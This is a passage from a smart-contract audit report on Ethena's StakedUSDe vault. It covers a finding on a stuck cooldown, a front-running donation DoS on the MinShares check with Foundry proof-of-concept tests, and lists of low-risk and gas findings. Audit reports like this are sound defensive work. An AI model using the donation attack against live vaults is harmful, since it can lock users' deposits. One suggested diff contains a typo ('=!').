Alice sees Bob has gotten his tokens but Alice cant use the redeem()/withdraw() because her `StakedUSDeV2` were already burned and her underlying assets were sent to the silo contract for storage. Alice cannot sucessfully call `unstake()` because her `userCooldown.cooldownEnd`  value set to \~ 90 days. Now Alice has to unfairly wait out the 90 days even though coolDowns have been turned off and everyone else has unrestricted access to their assets. Alice only crime is trying to withdraw earlier than Bob. This is a loss to Alice as Alice has no StakedUSDE or the underlying asset for the no longer necessary 90 days as if the assset is volatile, it may lose some fiat value during the unfair and no longer necessary wait period.

If cooldown is turned off, it should affect all contract processes and as such, withdrawals should become immediate to users. Tokens previously stored in the USDeSilo contract should become accessible to users when the cooldown state is off. Previous withdrawal requests that had a cooldown should no longer be restricted by a coolDown period since coolDown now off and the coolDownDuration of the contract is now 0.

### Proof of Concept

*   Since StakedUSDeV2 is ERC4626, user calls [deposit()](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/94697be8a3f0dfcd95dfb13ffbd39b5973f5c65d/contracts/token/ERC20/extensions/ERC4626.sol#L171C1-L181C6) to deposit the underlying token asset and get minted shares that signify the user's position size in the vault.

*   The coolDown duration is set to 90 days on deployment of the `StakedUSDeV2` contract, meaning coolDown is toggled on by default.

*   User cannot redeem/withdraw his funds via [withdraw()](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L52C1-L61C1) and [redeem()](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L65C1-L73C4) because coolDown is on. Both functions have the [ensureCooldownOff](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L27C1-L30C4) modifier which reverts if the coolDownDuration value is not 0.

*   User tried to exit position, to withdraw when coolDown is on, user must call coolDownAsset()/coolDownShares(). This will cause :

    *   For the user's underlyingAmount and cooldownEnd timestamp values to be set in the mapping `cooldowns`.  cooldownEnd timestamp values is set to 90 days from the present.
    *   For the user's `StakedUSDeV2` ERC4626 position shares to be burnt and the positon underlying asset value to be sent to the USDeSilo contract.

```

        /// @notice redeem assets and starts a cooldown to claim the converted underlying asset
        /// @param assets assets to redeem
        /// @param owner address to redeem and start cooldown, owner must allowed caller to perform this action
        function cooldownAssets(uint256 assets, address owner) external ensureCooldownOn returns (uint256) {
         if (assets > maxWithdraw(owner)) revert ExcessiveWithdrawAmount();

         uint256 shares = previewWithdraw(assets);

         cooldowns[owner].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
         cooldowns[owner].underlyingAmount += assets;

         _withdraw(_msgSender(), address(silo), owner, assets, shares);

         return shares;
        }

        /// @notice redeem shares into assets and starts a cooldown to claim the converted underlying asset
        /// @param shares shares to redeem
        /// @param owner address to redeem and start cooldown, owner must allowed caller to perform this action
        function cooldownShares(uint256 shares, address owner) external ensureCooldownOn returns (uint256) {
         if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();

         uint256 assets = previewRedeem(shares);

         cooldowns[owner].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
         cooldowns[owner].underlyingAmount += assets;

         _withdraw(_msgSender(), address(silo), owner, assets, shares);

         return assets;
        }
```

*   User can only use unstake() to get the assets from the silo contract. unstake enforces that the block.timestamp (present time) is more than the 90 days cooldown period set during the execution of `cooldownAssets()` and `cooldownShares()` and reverts if 90 days time has not been reached yet.

```

      function unstake(address receiver) external {
        UserCooldown storage userCooldown = cooldowns[msg.sender];
        uint256 assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd) {
          userCooldown.cooldownEnd = 0;
          userCooldown.underlyingAmount = 0;

          silo.withdraw(receiver, assets);
        } else {
          revert InvalidCooldown();
        }
      }
```

*   If contract admin decides to turn the coolDown period off, by setting the cooldownDuration to 0 via [setCooldownDuration()](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L126C1-L135C2), user who has his assets under the coolDown in the silo still wont be able to withdraw via [unstake()](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L78C1-L90C4) because the logic in `unstake()` doesnt allow for the user's coolDownEnd value which was set under the previous coolDown duration state to be bypassed as coolDowns are now turned off and the StakedUSDeV2 behavior is supposed to be changed to follow ERC4626 standard and allow for the user assets to get to them immediately with no coolDown period still enforced on withdrawals as seen in the comment [here](https://github.com/code-423n4/2023-10-ethena/blob/ee67d9b542642c9757a6b826c82d0cae60256509/contracts/StakedUSDeV2.sol#L124C38-L124C135).

*   User who initiated withdrawal when the coolDown was toggled on will still continue to be restricted from his tokens/funds even after coolDown is toggled off. This should not be because restrictions are removed, all previous pending withdrawals should be allowed to be completed without wait for 90 days since the coolDownDuration of the contract is now 0.

### Coded Proof of Concept

Run with `forge test --mt test_UnstakeUnallowedAfterCooldownIsTurnedOff`.
```

    // SPDX-License-Identifier: MIT
    pragma solidity >=0.8;

    /* solhint-disable private-vars-leading-underscore  */
    /* solhint-disable var-name-mixedcase  */
    /* solhint-disable func-name-mixedcase  */

    import "forge-std/console.sol";
    import "forge-std/Test.sol";
    import {SigUtils} from "forge-std/SigUtils.sol";

    import "../../../contracts/USDe.sol";
    import "../../../contracts/StakedUSDeV2.sol";
    import "../../../contracts/interfaces/IUSDe.sol";
    import "../../../contracts/interfaces/IERC20Events.sol";

    contract StakedUSDeV2CooldownTest is Test, IERC20Events {
      USDe public usdeToken;
      StakedUSDeV2 public stakedUSDeV2;
      SigUtils public sigUtilsUSDe;
      SigUtils public sigUtilsStakedUSDe;
      uint256 public _amount = 100 ether;

      address public owner;
      address public alice;
      address public bob;
      address public greg;

      bytes32 SOFT_RESTRICTED_STAKER_ROLE;
      bytes32 FULL_RESTRICTED_STAKER_ROLE;
      bytes32 DEFAULT_ADMIN_ROLE;
      bytes32 BLACKLIST_MANAGER_ROLE;
      bytes32 REWARDER_ROLE;

      event Deposit(address indexed caller, address indexed owner, uint256 assets, uint256 shares);
      event Withdraw(
        address indexed caller, address indexed receiver, address indexed owner, uint256 assets, uint256 shares
      );
      event LockedAmountRedistributed(address indexed from, address indexed to, uint256 amountToDistribute);

      function setUp() public virtual {
        usdeToken = new USDe(address(this));

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        greg = makeAddr("greg");
        owner = makeAddr("owner");

        usdeToken.setMinter(address(this));

        vm.startPrank(owner);
        stakedUSDeV2 = new StakedUSDeV2(IUSDe(address(usdeToken)), makeAddr('rewarder'), owner);
        vm.stopPrank();

        FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
        SOFT_RESTRICTED_STAKER_ROLE = keccak256("SOFT_RESTRICTED_STAKER_ROLE");
        DEFAULT_ADMIN_ROLE = 0x00;
        BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
        REWARDER_ROLE = keccak256("REWARDER_ROLE");
      }

      function test_UnstakeUnallowedAfterCooldownIsTurnedOff () public {
        address staker = address(20);
        uint usdeTokenAmountToMint = 10000*1e18;

        usdeToken.mint(staker, usdeTokenAmountToMint);

        //at the deposit coolDownDuration is set to 90 days 
        assert(stakedUSDeV2.cooldownDuration() == 90 days);

        vm.startPrank(staker);
        usdeToken.approve(address(stakedUSDeV2), usdeTokenAmountToMint);
        
        stakedUSDeV2.deposit(usdeTokenAmountToMint / 2, staker);

        vm.roll(block.number + 1);
        uint assets  = stakedUSDeV2.maxWithdraw(staker);
        stakedUSDeV2.cooldownAssets(assets , staker);
        
        vm.stopPrank();

        //assert that cooldown for the staker is now set to 90 days from now 
        ( uint104 cooldownEnd, ) = stakedUSDeV2.cooldowns(staker);
        assert(cooldownEnd == uint104( block.timestamp + 90 days));

        vm.prank(owner);
        //toggle coolDown off in the contract 
        stakedUSDeV2.setCooldownDuration(0);

        //now try to unstake, 
        /** since cooldown duration is now 0 and contract is cooldown state is turned off. 
        it should allow unstake immediately but instead it will revert **/
        vm.expectRevert(IStakedUSDeCooldown.InvalidCooldown.selector);
        vm.prank(staker);
        stakedUSDeV2.unstake(staker);
      }
    }
```

### Tools Used

Manual review, Foundry

### Recommended Mitigation Steps

Modify the code in unstake() fcn to allow for withdrawals from the silo contract when the contract's coolDownDuration has become 0.

### Assessed type

Error

**[kayinnnn (Ethena) confirmed and commented](https://github.com/code-423n4/2023-10-ethena-findings/issues/198#issuecomment-1858131607):**
> Acknowledge the issue, but revise to low severity finding as it causes minor inconvenience in the rare time we change cooldown period. However, it is still fixed - existing per user cooldown is ignored if the global cooldown is `0`.

***

## [[M-04] Malicious users can front-run to cause a denial of service (DoS) for StakedUSDe due to MinShares checks](https://github.com/code-423n4/2023-10-ethena-findings/issues/88)
*Submitted by [ayden](https://github.com/code-423n4/2023-10-ethena-findings/issues/88), also found by d3e4 ([1](https://github.com/code-423n4/2023-10-ethena-findings/issues/713), [2](https://github.com/code-423n4/2023-10-ethena-findings/issues/712)), [pontifex](https://github.com/code-423n4/2023-10-ethena-findings/issues/703), [trachev](https://github.com/code-423n4/2023-10-ethena-findings/issues/676), [ciphermarco](https://github.com/code-423n4/2023-10-ethena-findings/issues/670), [Madalad](https://github.com/code-423n4/2023-10-ethena-findings/issues/578), [Yanchuan](https://github.com/code-423n4/2023-10-ethena-findings/issues/571), [peanuts](https://github.com/code-423n4/2023-10-ethena-findings/issues/551), [twcctop](https://github.com/code-423n4/2023-10-ethena-findings/issues/465), [cartlex\_](https://github.com/code-423n4/2023-10-ethena-findings/issues/462), [mert\_eren](https://github.com/code-423n4/2023-10-ethena-findings/issues/447), 0xWaitress ([1](https://github.com/code-423n4/2023-10-ethena-findings/issues/63), [2](https://github.com/code-423n4/2023-10-ethena-findings/issues/60)), and [critical-or-high](https://github.com/code-423n4/2023-10-ethena-findings/issues/32)*

Malicious users can transfer `USDe` token to `StakedUSDe` protocol directly lead to a denial of service (DoS) for StakedUSDe due to the limit shares check.

### Proof of Concept

User deposit `USDe` token to `StakedUSDe` protocol to get share via invoke external `deposit` function. Let's see how share is calculate:

```solidity
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) {
        return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);
    }
```

Since `decimalsOffset() == 0` and totalAssets equal the balance of `USDe` in this protocol

```solidity
    function totalAssets() public view virtual override returns (uint256) {
        return _asset.balanceOf(address(this));
    }
```

$$
f(share) = (USDeAmount \ast totalSupply) / (totalUSDeAssets() + 1)
$$

The minimum share is set to 1 ether.

```solidity
  uint256 private constant MIN_SHARES = 1 ether;
```

Assuming malicious users transfer 1 ether of `USDe` into the protocol and receive ZERO shares, how much tokens does the next user need to pay if they want to exceed the minimum share limit of 1 ether? That would be 1 ether times 1 ether, which is a substantial amount.

I add a test case in `StakedUSDe.t.sol`:

```solidity
  function testMinSharesViolation() public {
    address malicious = vm.addr(100);

    usdeToken.mint(malicious, 1 ether);
    usdeToken.mint(alice, 1000 ether);

    //assume malicious user deposit 1 ether into protocol.
    vm.startPrank(malicious);
    usdeToken.transfer(address(stakedUSDe), 1 ether);

    
    vm.stopPrank();
    vm.startPrank(alice);
    usdeToken.approve(address(stakedUSDe), type(uint256).max);

    //1000 ether can't exceed the minimum share limit of 1 ether
    vm.expectRevert(IStakedUSDe.MinSharesViolation.selector);
    stakedUSDe.deposit(1000 ether, alice);
  }
```

We can see even Alice deposit a substantial number of tokens but still cannot surpass the 1 ether share limit which will lead to a denial of service (DoS) for StakedUSDe due to MinShares checks.

### Tools Used

vscode

### Recommended Mitigation Steps

We can solve this issue by setting a minimum deposit amount.

### Assessed type

DoS

**[FJ-Riveros (Ethena) acknowledged, but disagreed with severity and commented via duplicate issue \#32](https://github.com/code-423n4/2023-10-ethena-findings/issues/32#issuecomment-1805643280):**
 > We acknowledge the potential exploitability of this issue, but we propose marking it as `Medium` severity. Our rationale is based on the fact that this exploit can only occur during deployment. To mitigate this risk, we plan to fund the smart contract in the next block, ensuring that nobody has access to the ABI or contract source code. We could even use flashbots for this purpose. 

**[0xDjango (judge) commented via duplicate issue \#32](https://github.com/code-423n4/2023-10-ethena-findings/issues/88#issuecomment-1828560633):**
 > Agree with medium. Several of the duplicate reports vary in their final impacts but mostly consist of:
> 
> - Small donation leading to bricked contract
> - Large donation can eventually lead to blocked withdrawals
> 
> The small donation impact simply requires a redeploy, though the impact is a valid medium. The large donation has major implications for stakers, but the large amount of capital required downgrades it to medium as well. I will be reviewing each duplicate on a case-by-case basis to ensure that all impacts due to the same bug class fit within medium.

**[0xDjango (judge) decreased severity to Medium](https://github.com/code-423n4/2023-10-ethena-findings/issues/88#issuecomment-1806415374)**



***

# Low Risk and Non-Critical Issues

For this audit, 98 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-ethena-findings/issues/602) by **0xmystery** received the top score from the judge.

*The following wardens also submitted reports: [lsaudit](https://github.com/code-423n4/2023-10-ethena-findings/issues/329), [0xhunter](https://github.com/code-423n4/2023-10-ethena-findings/issues/735), [Team\_Rocket](https://github.com/code-423n4/2023-10-ethena-findings/issues/733), [qpzm](https://github.com/code-423n4/2023-10-ethena-findings/issues/731), [erebus](https://github.com/code-423n4/2023-10-ethena-findings/issues/729), [ge6a](https://github.com/code-423n4/2023-10-ethena-findings/issues/728), [hunter\_w3b](https://github.com/code-423n4/2023-10-ethena-findings/issues/724), [adam-idarrha](https://github.com/code-423n4/2023-10-ethena-findings/issues/718), [pontifex](https://github.com/code-423n4/2023-10-ethena-findings/issues/711), [SovaSlava](https://github.com/code-423n4/2023-10-ethena-findings/issues/698), [Avci](https://github.com/code-423n4/2023-10-ethena-findings/issues/692), [Arz](https://github.com/code-423n4/2023-10-ethena-findings/issues/684), [Breeje](https://github.com/code-423n4/2023-10-ethena-findings/issues/673), [PASCAL](https://github.com/code-423n4/2023-10-ethena-findings/issues/662), [Udsen](https://github.com/code-423n4/2023-10-ethena-findings/issues/657), [rotcivegaf](https://github.com/code-423n4/2023-10-ethena-findings/issues/636), [0x11singh99](https://github.com/code-423n4/2023-10-ethena-findings/issues/627), [asui](https://github.com/code-423n4/2023-10-ethena-findings/issues/623), [codynhat](https://github.com/code-423n4/2023-10-ethena-findings/issues/618), [radev\_sw](https://github.com/code-423n4/2023-10-ethena-findings/issues/617), [Kaysoft](https://github.com/code-423n4/2023-10-ethena-findings/issues/616), [BeliSesir](https://github.com/code-423n4/2023-10-ethena-findings/issues/612), [deepkin](https://github.com/code-423n4/2023-10-ethena-findings/issues/611), [JCK](https://github.com/code-423n4/2023-10-ethena-findings/issues/598), [ThreeSigma](https://github.com/code-423n4/2023-10-ethena-findings/issues/590), [Madalad](https://github.com/code-423n4/2023-10-ethena-findings/issues/583), [0xG0P1](https://github.com/code-423n4/2023-10-ethena-findings/issues/582), [Imlazy0ne](https://github.com/code-423n4/2023-10-ethena-findings/issues/568), [Mike\_Bello90](https://github.com/code-423n4/2023-10-ethena-findings/issues/565), [tnquanghuy0512](https://github.com/code-423n4/2023-10-ethena-findings/issues/561), [peanuts](https://github.com/code-423n4/2023-10-ethena-findings/issues/560), [supersizer0x](https://github.com/code-423n4/2023-10-ethena-findings/issues/554), [Shubham](https://github.com/code-423n4/2023-10-ethena-findings/issues/550), [0xAadi](https://github.com/code-423n4/2023-10-ethena-findings/issues/545), [pep7siup](https://github.com/code-423n4/2023-10-ethena-findings/issues/523), [pipidu83](https://github.com/code-423n4/2023-10-ethena-findings/issues/520), [adeolu](https://github.com/code-423n4/2023-10-ethena-findings/issues/514), [Kral01](https://github.com/code-423n4/2023-10-ethena-findings/issues/502), [jasonxiale](https://github.com/code-423n4/2023-10-ethena-findings/issues/491), [cccz](https://github.com/code-423n4/2023-10-ethena-findings/issues/489), [oakcobalt](https://github.com/code-423n4/2023-10-ethena-findings/issues/487), [cryptonue](https://github.com/code-423n4/2023-10-ethena-findings/issues/486), [twcctop](https://github.com/code-423n4/2023-10-ethena-findings/issues/485), [pavankv](https://github.com/code-423n4/2023-10-ethena-findings/issues/481), [Eeyore](https://github.com/code-423n4/2023-10-ethena-findings/issues/471), [cartlex\_](https://github.com/code-423n4/2023-10-ethena-findings/issues/464), [kkkmmmsk](https://github.com/code-423n4/2023-10-ethena-findings/issues/453), [arjun16](https://github.com/code-423n4/2023-10-ethena-findings/issues/452), [squeaky\_cactus](https://github.com/code-423n4/2023-10-ethena-findings/issues/445), [Rickard](https://github.com/code-423n4/2023-10-ethena-findings/issues/442), [Noro](https://github.com/code-423n4/2023-10-ethena-findings/issues/441), [Proxy](https://github.com/code-423n4/2023-10-ethena-findings/issues/436), [J4X](https://github.com/code-423n4/2023-10-ethena-findings/issues/430), [Al-Qa-qa](https://github.com/code-423n4/2023-10-ethena-findings/issues/426), [ziyou-](https://github.com/code-423n4/2023-10-ethena-findings/issues/394), [chainsnake](https://github.com/code-423n4/2023-10-ethena-findings/issues/393), [HChang26](https://github.com/code-423n4/2023-10-ethena-findings/issues/385), [oxchsyston](https://github.com/code-423n4/2023-10-ethena-findings/issues/381), [Yanchuan](https://github.com/code-423n4/2023-10-ethena-findings/issues/370), [btk](https://github.com/code-423n4/2023-10-ethena-findings/issues/350), [0xStalin](https://github.com/code-423n4/2023-10-ethena-findings/issues/347), [Bauchibred](https://github.com/code-423n4/2023-10-ethena-findings/issues/340), [Fitro](https://github.com/code-423n4/2023-10-ethena-findings/issues/331), [rokinot](https://github.com/code-423n4/2023-10-ethena-findings/issues/308), [matrix\_0wl](https://github.com/code-423n4/2023-10-ethena-findings/issues/294), [Walter](https://github.com/code-423n4/2023-10-ethena-findings/issues/291), [ZanyBonzy](https://github.com/code-423n4/2023-10-ethena-findings/issues/289), [young](https://github.com/code-423n4/2023-10-ethena-findings/issues/284), [Zach\_166](https://github.com/code-423n4/2023-10-ethena-findings/issues/260), [Topmark](https://github.com/code-423n4/2023-10-ethena-findings/issues/250), [ast3ros](https://github.com/code-423n4/2023-10-ethena-findings/issues/238), [degensec](https://github.com/code-423n4/2023-10-ethena-findings/issues/222), [almurhasan](https://github.com/code-423n4/2023-10-ethena-findings/issues/216), [nuthan2x](https://github.com/code-423n4/2023-10-ethena-findings/issues/210), [csanuragjain](https://github.com/code-423n4/2023-10-ethena-findings/issues/209), [PENGUN](https://github.com/code-423n4/2023-10-ethena-findings/issues/202), [0xpiken](https://github.com/code-423n4/2023-10-ethena-findings/issues/197), [zhaojie](https://github.com/code-423n4/2023-10-ethena-findings/issues/192), [ptsanev](https://github.com/code-423n4/2023-10-ethena-findings/issues/165), [marchev](https://github.com/code-423n4/2023-10-ethena-findings/issues/152), [castle\_chain](https://github.com/code-423n4/2023-10-ethena-findings/issues/151), [sorrynotsorry](https://github.com/code-423n4/2023-10-ethena-findings/issues/146), [ayden](https://github.com/code-423n4/2023-10-ethena-findings/issues/138), [0xAlix2](https://github.com/code-423n4/2023-10-ethena-findings/issues/137), [Strausses](https://github.com/code-423n4/2023-10-ethena-findings/issues/133), [foxb868](https://github.com/code-423n4/2023-10-ethena-findings/issues/120), [dirk\_y](https://github.com/code-423n4/2023-10-ethena-findings/issues/108), [max10afternoon](https://github.com/code-423n4/2023-10-ethena-findings/issues/103), [DarkTower](https://github.com/code-423n4/2023-10-ethena-findings/issues/89), [rvierdiiev](https://github.com/code-423n4/2023-10-ethena-findings/issues/78), [0xWaitress](https://github.com/code-423n4/2023-10-ethena-findings/issues/64), [twicek](https://github.com/code-423n4/2023-10-ethena-findings/issues/56), [lanrebayode77](https://github.com/code-423n4/2023-10-ethena-findings/issues/53), [0x\_Scar](https://github.com/code-423n4/2023-10-ethena-findings/issues/44), [Bughunter101](https://github.com/code-423n4/2023-10-ethena-findings/issues/29), [0xhacksmithh](https://github.com/code-423n4/2023-10-ethena-findings/issues/10), and [critical-or-high](https://github.com/code-423n4/2023-10-ethena-findings/issues/4).*

## [01] Use an efficient logic in setter functions
When intending to emit both the old and new values, there isn't a need to cache the old value that will only be used once. Simply emit both values before assigning a new value to the state variable. For example, the following setter function may be refactored as follows:

https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L436-L440

```diff
  function _setMaxMintPerBlock(uint256 _maxMintPerBlock) internal {
+    emit MaxMintPerBlockChanged(maxMintPerBlock, _maxMintPerBlock);
-    uint256 oldMaxMintPerBlock = maxMintPerBlock;
    maxMintPerBlock = _maxMintPerBlock;
-    emit MaxMintPerBlockChanged(oldMaxMintPerBlock, maxMintPerBlock);
  }
```
All other instances entailed:

https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L442-L447

```solidity
  /// @notice Sets the max redeemPerBlock limit
  function _setMaxRedeemPerBlock(uint256 _maxRedeemPerBlock) internal {
    uint256 oldMaxRedeemPerBlock = maxRedeemPerBlock;
    maxRedeemPerBlock = _maxRedeemPerBlock;
    emit MaxRedeemPerBlockChanged(oldMaxRedeemPerBlock, maxRedeemPerBlock);
  }
```
https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L126-L134

```solidity
  function setCooldownDuration(uint24 duration) external onlyRole(DEFAULT_ADMIN_ROLE) {
    if (duration > MAX_COOLDOWN_DURATION) {
      revert InvalidCooldown();
    }

    uint24 previousDuration = cooldownDuration;
    cooldownDuration = duration;
    emit CooldownDurationUpdated(previousDuration, cooldownDuration);
  }
```

## [02] Be consistent in the code logic when emitting events in setter functions
By convention, it's recommended emitting the old value followed by the new one in the same event instead of the other way round.

Here's one instance found:

https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/USDe.sol#L23-L26

```diff  
  function setMinter(address newMinter) external onlyOwner {
-    emit MinterUpdated(newMinter, minter);
+    emit MinterUpdated(minter, newMinter);
    minter = newMinter;
  }
```

## [03] Delta neutrality caution
Users should be cautioned about the impermanent losses entailed arising from the delta-neutral stability strategy adopted by the protocol, specifically if the short positions were to encounter hefty losses. Apparently, the users could have held on to their collateral, e.g. `stETH or WETH`, and ended up a lot richer with the equivalent amount of `USDe`. I suggest all minting entries to begin with stable coins like `USDC, DAI etc` that could be converted to `stETH` to generate yield if need be instead of having users depositing `stETH` from their wallet reserves. Psychologically, this will make the users feel better as the mentality has been fostered more on preserving the 1:1 peg of `USDe` at all times. 

## [04] Easy DoS on big players when minting and redeeming in EthenaMinting.sol
As indicated on the audit description, users intending to mint/redeem a large amount will need to mint/redeem over several blocks due to `maxMintPerBlock` or `maxRedeemPerBlock`. However, these RFQ's are prone to DoS because [`mintedPerBlock[block.number] + mintAmount > maxMintPerBlock`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L98) or [`redeemedPerBlock[block.number] + redeemAmount > maxRedeemPerBlock`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L105) could revert by only 1 wei in excess.

While these issues could be sorted by the backend to make a full use of `maxMintPerBlock` or `maxRedeemPerBlock` per block, it will make the intended logic a lot more efficient by auto reducing the RFQ amount to perfectly fill up the remaining quota for the current block. Better yet, set up a queue system where request amount running in hundreds of thousands or millions may be auto split up with multiple orders via only one signature for batching.

## [05] Inexpedient code lines
In the function below, the if block already dictates that `getUnvestedAmount() == 0` manages to avoid a revert. Hence, consider refactoring the following code lines as it makes no sense adding 0 value `getUnvestedAmount()` of to the addend, `amount`:   
      
https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDe.sol#L89-L99

```diff
  function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
    if (getUnvestedAmount() > 0) revert StillVesting();
-    uint256 newVestingAmount = amount + getUnvestedAmount();

-    vestingAmount = newVestingAmount;
+    vestingAmount = amount;

    // The rest of the codes
  }
```

## [06] Emission of identical values
Under the context of the above/preceding recommendation, `transferInRewards()` should also have its `emit` refactored below. Otherwise, you are practically emitting two identical values that defeat the purpose of contrasting the old and the values.

https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDe.sol#L89-L99

```diff
  function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
    if (getUnvestedAmount() > 0) revert StillVesting();
-    uint256 newVestingAmount = amount + getUnvestedAmount();

-    vestingAmount = newVestingAmount;
+    emit RewardsReceived(vestingAmount, amount);
+    vestingAmount = amount;
    lastDistributionTimestamp = block.timestamp;
    // transfer assets from rewarder to this contract
    IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

-    emit RewardsReceived(amount, newVestingAmount);
  }
```

## [07] Typo mistakes
https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L94<br>
https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/StakedUSDeV2.sol#L110

```diff
-  /// @param owner address to redeem and start cooldown, owner must allowed caller to perform this action
+  /// @param owner address to redeem and start cooldown, owner must allow caller to perform this action
```

## [08] Functions should have fully intended logic
The function below is meant to be used only for minting. Hence, redeeming has got nothing to do with this view function. Consider refactoring the first if block so [`mint()`](https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L171) could revert earlier if need be:

https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L351-L374

```diff
  function verifyRoute(Route calldata route, OrderType orderType) public view override returns (bool) {
    // routes only used to mint
-    if (orderType == OrderType.REDEEM) {
-      return true;
-    }
+    if (orderType =! OrderType.MINT) {
+      return false;
+    }
    uint256 totalRatio = 0;
    if (route.addresses.length != route.ratios.length) {
      return false;
    }
    if (route.addresses.length == 0) {
      return false;
    }
    for (uint256 i = 0; i < route.addresses.length; ++i) {
      if (!_custodianAddresses.contains(route.addresses[i]) || route.addresses[i] == address(0) || route.ratios[i] == 0)
      {
        return false;
      }
      totalRatio += route.ratios[i];
    }
    if (totalRatio != 10_000) {
      return false;
    }
    return true;
  }
```

## [09] Unneeded function still not removed
Per Pashov's audit report, L-04 mentioned that the unused `EthenaMinting::encodeRoute` has been removed by Ethena. However, this erroneous function still exists in EthenaMinting.sol. 

https://github.com/code-423n4/2023-10-ethena/blob/main/contracts/EthenaMinting.sol#L334-L336

```diff
-  function encodeRoute(Route calldata route) public pure returns (bytes memory) {
-    return abi.encode(ROUTE_TYPE, route.addresses, route.ratios);
-  }
```
Consider removing this controversial function where possible. 

**[FJ-Riveros (Ethena) acknowledged](https://github.com/code-423n4/2023-10-ethena-findings/issues/602#issuecomment-1804182947)**

***Note: the following submissions from the same warden were downgraded from Medium to Low/Non-critical and were also considered by the judge in scoring:***
- [[10] Inconsistent Role-Based Checks in `redistributeLockedAmount` and `_beforeTokenTransfer functions`](https://github.com/code-423n4/2023-10-ethena-findings/issues/367)
- [[11] Denial-of-Service Vulnerability via Minimum Shares Restriction](https://github.com/code-423n4/2023-10-ethena-findings/issues/371)
- [[12] Inflexible Withdrawal Management in StakedUSDeV2 Contract](https://github.com/code-423n4/2023-10-ethena-findings/issues/389)



***

# Gas Optimizations

For this audit, 41 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-10-ethena-findings/issues/443) by **0xVolcano** received the top score from the judge.

*The following wardens also submitted reports: [0xAnah](https://github.com/code-423n4/2023-10-ethena-findings/issues/652), [hunter\_w3b](https://github.com/code-423n4/2023-10-ethena-findings/issues/515), [SovaSlava](https://github.com/code-423n4/2023-10-ethena-findings/issues/348), [niser93](https://github.com/code-423n4/2023-10-ethena-findings/issues/333), [lsaudit](https://github.com/code-423n4/2023-10-ethena-findings/issues/324), [SAQ](https://github.com/code-423n4/2023-10-ethena-findings/issues/722), [tabriz](https://github.com/code-423n4/2023-10-ethena-findings/issues/715), [J4X](https://github.com/code-423n4/2023-10-ethena-findings/issues/693), [petrichor](https://github.com/code-423n4/2023-10-ethena-findings/issues/664), [Udsen](https://github.com/code-423n4/2023-10-ethena-findings/issues/661), [shamsulhaq123](https://github.com/code-423n4/2023-10-ethena-findings/issues/659), [radev\_sw](https://github.com/code-423n4/2023-10-ethena-findings/issues/649), [Raihan](https://github.com/code-423n4/2023-10-ethena-findings/issues/645), [0x11singh99](https://github.com/code-423n4/2023-10-ethena-findings/issues/607), [JCK](https://github.com/code-423n4/2023-10-ethena-findings/issues/600), [0xAadi](https://github.com/code-423n4/2023-10-ethena-findings/issues/599), [ThreeSigma](https://github.com/code-423n4/2023-10-ethena-findings/issues/580), [0xhex](https://github.com/code-423n4/2023-10-ethena-findings/issues/570), [brakelessak](https://github.com/code-423n4/2023-10-ethena-findings/issues/567), [unique](https://github.com/code-423n4/2023-10-ethena-findings/issues/564), [oakcobalt](https://github.com/code-423n4/2023-10-ethena-findings/issues/555), [0xta](https://github.com/code-423n4/2023-10-ethena-findings/issues/553), [0xpiken](https://github.com/code-423n4/2023-10-ethena-findings/issues/544), [arjun16](https://github.com/code-423n4/2023-10-ethena-findings/issues/542), [thekmj](https://github.com/code-423n4/2023-10-ethena-findings/issues/527), [phenom80](https://github.com/code-423n4/2023-10-ethena-findings/issues/522), [aslanbek](https://github.com/code-423n4/2023-10-ethena-findings/issues/498), [Rolezn](https://github.com/code-423n4/2023-10-ethena-findings/issues/496), [yashgoel72](https://github.com/code-423n4/2023-10-ethena-findings/issues/493), [0xgrbr](https://github.com/code-423n4/2023-10-ethena-findings/issues/482), [pavankv](https://github.com/code-423n4/2023-10-ethena-findings/issues/480), [Sathish9098](https://github.com/code-423n4/2023-10-ethena-findings/issues/467), [SM3\_SS](https://github.com/code-423n4/2023-10-ethena-findings/issues/362), [nuthan2x](https://github.com/code-423n4/2023-10-ethena-findings/issues/256), 